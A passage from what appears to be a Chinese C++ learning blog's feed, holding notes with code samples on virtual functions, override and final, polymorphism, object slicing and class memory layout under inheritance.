class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在多态之前控制这种行为的时候，一般都是通过传入参数不同</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">(NPCObject *obj)</span></span>&#123;</span><br><span class="line">obj-&gt;<span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">(MonsterObject *obj)</span></span>&#123;</span><br><span class="line">obj-&gt;<span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>学习了多态之后，因为有向下转型的特性：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">move</span><span class="params">(MoveObject *obj)</span></span>&#123;</span><br><span class="line">obj-&gt;<span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/virtualFunction/000.png" class=""><p>我们就可以通过这种方式传递。</p><img src="/2022/07/02/virtualFunction/001.png" class=""><p>这里没有输出是因为派生类调用的是基类的move，基类的move里面我们没有输出项。</p><hr><p>当我们设置基类的move函数为虚函数时，其实就是告诉编译器基类的这个函数是虚的，派生类可以自定义。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MoveObject</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">virtual</span> <span class="title">Move</span><span class="params">()</span></span>&#123;        <span class="comment">//虚函数</span></span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/virtualFunction/002.png" class=""><p>看到基类的函数设置成虚函数之后，在派生类调用的时候就会自动匹配到派生类的函数。</p><p>本质上就是动态绑定，因为基类的函数并不是说从内存上被覆盖了，而是派生类有重写的情况下就用派生类的，没有的话还是会用基类的。</p><hr><h2 id="虚函数使用条件"><a href="#虚函数使用条件" class="headerlink" title="虚函数使用条件"></a>虚函数使用条件</h2><p><code>virtual</code>只能写在类的内部生命或者定义，不能写在外部，也就是外部的全局函数。<br>调用类的对象是无法使用虚函数的，必须使用基类指针来实现虚函数的调用<br>虚函数在派生类和基类中必须具有相同的及参数列表<br>虚函数在派生类和基类中返回值要求基本一致，但是当返回类型为该类型的指针和引用时除外<br>虚函数不能是函数模板</p><hr><p>override 后缀可以强制要求检查函数是重载<br>final 后缀可以终止函数的重载</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MoveObject</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">virtual</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NPCObject</span> :<span class="keyword">public</span> MoveObject&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;NPCobject!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>学习了虚函数之后，我们知道继承的时候也会带上，那么NPC中的这个Move其实也就是一个虚函数，只不过我们再次重写了。</p><img src="/2022/07/02/virtualFunction/003.png" class=""><p>编译器也能看得到，当然这么写没太大关系，但是等NPC被别的类继承的时候，虽然函数还是叫move，但是转到上一层没看到virtual这个关键字还以为它不是虚函数。</p><p>所以这个也要看编程习惯，如果基类中他是虚函数，那么派生类尽量就都要加上，方便被其他类派生的时候可以直观的看出。</p><p>然后final这个关键字是用于结束重载的，所以像是虚函数后面定义了这个，那么派生类就不用加virtual了，都已经取消重载了自然没有必要性。</p><p>override呢就比较有意思</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MoveObject</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">virtual</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NPCObject</span> :<span class="keyword">public</span> MoveObject&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;NPCobject!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在正常情况下,NPC中的move待了参数，编译器可能会认为他是单独的存在。</p><img src="/2022/07/02/virtualFunction/005.png" class=""><p>可以看到编译器认为它是属于NPC类的成员。<br>但事实上我们是让他继承过来重写的，而不是造成无论是意义上还是代码上的问题</p><img src="/2022/07/02/virtualFunction/004.png" class=""><p>解决方法override就派上用场了，他会强制检查这个成员是不是继承过来的。</p><hr><p>虚函数并不一定全部写在基类中，因为类可能不止派生一次，当派生了很多次的时候，难免会有一些有新的功能。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>虚函数在基类的private下，派生类就没法访问了，但虚函数在基类的public下，派生类改成private还是能用的，用的前期是通过指针，而不是直接.访问，毕竟派生类已经做成private。<br>但是在反复修改的时候其实间接的破坏了封装性，不利于维护。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多态</title>
      <link href="/2022/07/01/Polymorphic/"/>
      <url>/2022/07/01/Polymorphic/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个人，可以说他是只猴，也可以说他是哺乳动物，也可以说他是动物。但本质上就是个人。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><hr><h2 id="对象多态"><a href="#对象多态" class="headerlink" title="对象多态"></a>对象多态</h2><p>在前言之中，人可以推导是动物，但是动物不能百分百推断为人。</p><ol><li>向上转型 父类&#x3D;&gt;子类</li><li>向下转型 子类&#x3D;&gt;父类</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="type">int</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/01/Polymorphic/000.png" class=""><p>可以看到这样转型编译器没有报错，但是实际上还是会发生内存切片的问题，毕竟子类继承之后多了属性，传给父类，就有一个地方无法表达。</p><img src="/2022/07/01/Polymorphic/001.png" class=""><p>编译器会给出提示。</p><p>内存切片，也就是我们此处，pople是有一个成员的，当由pople继承animal的类，然后实例化，那么其实已经有了三个成员，而animal本身就只有两个，所以用pople实例化的对象传给animal的时候那个多余的成员就很有可能会被抛弃掉。变量还能看得到，函数有的时候就不好说了。</p><img src="/2022/07/01/Polymorphic/002.png" class=""><p>像这样过不去的基本原因就是pople有三个成员内存多一块，而animal只有两块，所以不存在合适和构造函数去转换。</p><p>当然因为这种本身就不合理，比价合理的是通过指针或者引用去传值。<br>以前面的为例：</p><img src="/2022/07/01/Polymorphic/003.png" class=""><p>这样就不存在什么内存切片的问题了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">animal anm&#123;&#125;;</span><br><span class="line">pople *pp = (pople*)&amp;anm;</span><br></pre></td></tr></table></figure><p>回到向下转型的问题，虽然强制转换anm为pople类型的指针，但是于本意上，更多的时候不会为了操作anm的内存而改变，可能是需要执行它的函数。</p><hr><h2 id="方法多态"><a href="#方法多态" class="headerlink" title="方法多态"></a>方法多态</h2><p>静态多态</p><ol><li>函数重载</li><li>函数模板</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">(animal &amp;anm)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">(pople &amp;pople)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/01/Polymorphic/004.png" class=""><p>像这种写在外部的，依靠传入参数区分的就是我们的函数重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Eat</span><span class="params">(<span class="type">const</span> T &amp;x)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像函数模板感觉还得在里面判断。</p><hr><p>动态的像写在类中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="type">int</span> sex;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当两个类不想关的时候，调用的eat就是各管各的。不用搞什么特殊。</p><p>可当继承的时候，函数也一并被继承，之前说过要么作用域要么using。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="type">int</span> sex;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">(animal *ani)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">(pople *pop)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>往函数里加形参固然是解决的问题之一，但从理解的角度则不是很好。<br>首先就是他是类的方法，本身就需要类去调用不说，你还要往里面传指针。</p><p>如果依照自上向下转型，制作一个基类的指针，然后if判断某个值，让这个指针指向派生类去做这个操作。<br>同样也是因为结果有了可变性不是固定死的，这种就被称为动态多态。</p><hr><p>除了虚基类，还有虚函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="type">int</span> sex;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">virtual</span> <span class="title">eat</span><span class="params">(animal *ani)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">virtual</span> <span class="title">eat</span><span class="params">(pople *pop)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>具体放后面讲</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>next</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类的转换</title>
      <link href="/2022/07/01/classconvert/"/>
      <url>/2022/07/01/classconvert/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>按照常规，类之间转换是通过副本构造函数，也可以叫拷贝函数实现。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Object</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> data_0 = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> data_1 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> data_2 = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> data_3 = <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>连续的内存，只要能知道data_0的内存地址，后面三个偏移一下也就得到了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">Object obj;</span><br><span class="line"><span class="type">int</span> *readO = (<span class="type">int</span> *)&amp;obj;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;obj地址：&quot;</span> &lt;&lt; &amp;obj &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(obj); i++)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;内存地址: &quot;</span> &lt;&lt; &amp;readO[i] &lt;&lt; <span class="string">&quot;值：&quot;</span> &lt;&lt;  readO[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过直接打印查看</p><img src="/2022/07/01/classconvert/000.png" class=""><p>可以看到int类型的内存占用之间相差四字节。</p><p>并且类的内存分配跟private和public那些没啥关系，当然前提是正常的类。</p><hr><p>进行第一次派生</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> Object&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> sdata_0 = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> sdata_1 = <span class="number">12</span>;</span><br><span class="line"><span class="type">int</span> sdata_2 = <span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> sdata_3 = <span class="number">14</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/01/classconvert/001.png" class=""><p>看到son类继承了Object的属性<br>可以说是把Object的成员照搬了过来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> Object&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">int data_0 = 1;</span></span><br><span class="line"><span class="comment">int data_1 = 2;</span></span><br><span class="line"><span class="comment">int data_2 = 3;</span></span><br><span class="line"><span class="comment">int data_3 = 4;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> sdata_0 = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> sdata_1 = <span class="number">12</span>;</span><br><span class="line"><span class="type">int</span> sdata_2 = <span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> sdata_3 = <span class="number">14</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><p>第二次派生</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> gsdata_0 = <span class="number">21</span>;</span><br><span class="line"><span class="type">int</span> gsdata_1 = <span class="number">22</span>;</span><br><span class="line"><span class="type">int</span> gsdata_2 = <span class="number">23</span>;</span><br><span class="line"><span class="type">int</span> gsdata_3 = <span class="number">24</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/01/classconvert/002.png" class=""><p>按照顺序继承，成员变量的地址自然也就按照从父类继承的开始顺序开辟。</p><hr><ol><li>不同编译可能存在优化，地址不一定顺序</li><li>但是派生类的大小，肯定是包含父类的</li><li>构造函数按照基类派生类的顺序依次构造，析构函数则相反，先从派生类开始</li></ol><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Object</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> data_0 = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> data_1 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> data_2 = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> data_3 = <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> data_0 = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> data_1 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> data_2 = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> data_3 = <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> Object,<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> sdata_0 = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> sdata_1 = <span class="number">12</span>;</span><br><span class="line"><span class="type">int</span> sdata_2 = <span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> sdata_3 = <span class="number">14</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> gsdata_0 = <span class="number">21</span>;</span><br><span class="line"><span class="type">int</span> gsdata_1 = <span class="number">22</span>;</span><br><span class="line"><span class="type">int</span> gsdata_2 = <span class="number">23</span>;</span><br><span class="line"><span class="type">int</span> gsdata_3 = <span class="number">24</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当重复继承的时候</p><img src="/2022/07/01/classconvert/003.png" class=""><p>能看到出现了两次1234<br>这是因为初始化在类中就完成了，你实际上直接访问是访问不到的，因为没有给编译器指定道路。<br>想要指定的话解决办法也就是作用域。</p><p>当然还有虚基类的方法。但是这个目前好像讲不明白，要有反汇编的能力，所以此处就简易过一下了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> <span class="keyword">virtual</span> Object,<span class="keyword">public</span> <span class="keyword">virtual</span>  father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> sdata_0 = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> sdata_1 = <span class="number">12</span>;</span><br><span class="line"><span class="type">int</span> sdata_2 = <span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> sdata_3 = <span class="number">14</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/01/classconvert/004.png" class=""><p>你会发现构造顺序变了，还多了一个值，这个值会代表什么。</p><p>而且我们知道，构造顺序肯定是先从基类开始的，只不过这里的内存布局好像被打乱了的样子。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个有点草率，前面都是正常的看看内存分析，后面改变虚基类的时候，打印出来的结果顺序比较奇怪，但是要从反汇编的角度才能看明白，可能就是对逆向的人会关注点，先搞正向就先留个印象得了。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解继承</title>
      <link href="/2022/07/01/understandinheritance/"/>
      <url>/2022/07/01/understandinheritance/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相对而言了解了继承在构造函数和析构函数时执行的区别。<br>包括函数重命名时作用域区分的时候。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h2><p>从生理学角度，一个儿子就一个爹。<br>但是子类比较特殊，它可以拥有多个父类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">pople</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;pople created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">wolf</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wolf created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当狼和人组合，产生子类狼人</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span>:<span class="keyword">public</span> pople,<span class="keyword">public</span> wolf&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">werewolf</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;werewolf created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>继承方式无所谓，一般都public，父类名由逗号分隔。</p><img src="/2022/07/01/understandinheritance/000.png" class=""><p>实例化类，能看到他是继承了两个父类，构造函数的顺序也跟我们继承时候的顺序相关。</p><p>当两个父类有相同的成员函数时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 